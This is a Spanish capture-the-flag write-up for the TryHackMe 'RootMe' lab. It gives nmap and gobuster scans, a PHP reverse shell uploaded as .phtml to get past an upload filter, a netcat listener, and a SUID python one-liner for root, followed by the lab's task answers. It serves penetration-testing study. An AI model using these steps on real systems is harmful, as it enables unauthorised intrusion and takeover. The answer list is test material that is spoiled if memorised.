# Maquina RootMe - TryHackme

* Nivel : Easy
* Máquina : Linux
* Útil para el Ejptv2
* Ip Maquina : 10.10.77.18 (En mi caso)

## Escaneo de puertos

```bash
sudo nmap -A -O -T4 -p- -Pn 10.10.77.18
```
```bash
Nmap scan report for 10.10.77.18
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/15%OT=22%CT=1%CU=34304%PV=Y%DS=2%DC=T%G=Y%TM=684E
OS:C7CA%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M509ST11NW6%O2=M509S
OS:T11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST11)WIN(W1=
OS:F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=
OS:M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   47.81 ms 10.21.0.1
2   47.90 ms 10.10.77.18

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.87 seconds
```
En esta máquina esta el puerto 80/tpc http abierto porlo tanto usaré gobuster para buscar directorios de interes.

```bash
gobuster dir -u http://10.10.77.18/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt,htm
```
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.77.18/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,htm
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.htm             (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htaccess.htm        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.htm        (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.77.18/css/]
/index.php            (Status: 200) [Size: 616]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 307] [--> http://10.10.77.18/js/]
/panel                (Status: 301) [Size: 310] [--> http://10.10.77.18/panel/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.77.18/uploads/]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```
Con este gobuster se puede ver que hay una ruta panel y uploads, hay que entrar a mirar.

Dentro de la ruta /panel/ se encuentra una parte de la web donde podemos subir un archivo.

![Imagen Panel](rootme.PNG)

## Reverse shell

Primero descargar un archivo .php que sirva como reverse shell como el de pentestmonkey https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```bash
Abrir el archivo .php con nano y editar el apartado de ip atacante y el puerto si quieres

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

```
Ahora abrir otra terminal y poner a escuchar con netcat en el puerto seleciónado en el php

```bash
nc -lvnp 4444             
listening on [any] 4444 ...
```
Ir al buscador, a la ruta /panel/ de la web y subir el archivo php-reverse-shell.php. Al subir nos mostrará un mensaje de error ya que el servidor no accepta el formato .php. Se puede renombrar las extension por .phtml y volverlo a subir.

Una vez subida ir a /http://10.10.77.18/uploads/, saldrá el archivo anterior subido. Click al archivo y donde esta el netcat, se a abierto una terminal remota con el user www-data.

```bash
nc -lvnp 1234             
listening on [any] 1234 ...
connect to [10.21.95.220] from (UNKNOWN) [10.10.77.18] 51598
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:51:19 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## Escalada de privilegios

Utilizar el comando find para buscar archivos que tengan SUID activado y de user es.
```bash
find / -perm -4000 -ls 2>/dev/null
```
```bash
787696     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   787234    112 -rwsr-xr-x   1 root     root         113528 Jul 10  2020 /usr/lib/snapd/snap-confine
   918336    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   787659     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   787841    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   787845     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   787467     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   787290     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
   787288     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
   787086     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
   266770   3580 -rwsr-sr-x   1 root     root        3665768 Aug  4  2020 /usr/bin/python
```
```
 266770   3580 -rwsr-sr-x   1 root     root        3665768 Aug  4  2020 /usr/bin/python
```
El archivo python pinta a poder encontrarse en GTFobins, pagina que podemos buscar comandos SUID para poder escalar de user.

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Whoami y ya eres root.

## Flag user

Utilizar el comando **find / -name user.txt** y luego cat

## Flag root

Utilizar el comando **find / -name root.txt** y luego cat

## Task 2 
* Scan the machine, how many ports are open?  2
* What version of Apache is running?  2.4.29
* What service is running on port 22? ssh
* What is the hidden directory? /panel/

## Task 4
Search for files with SUID permission, which file is weird?   /usr/bin/python
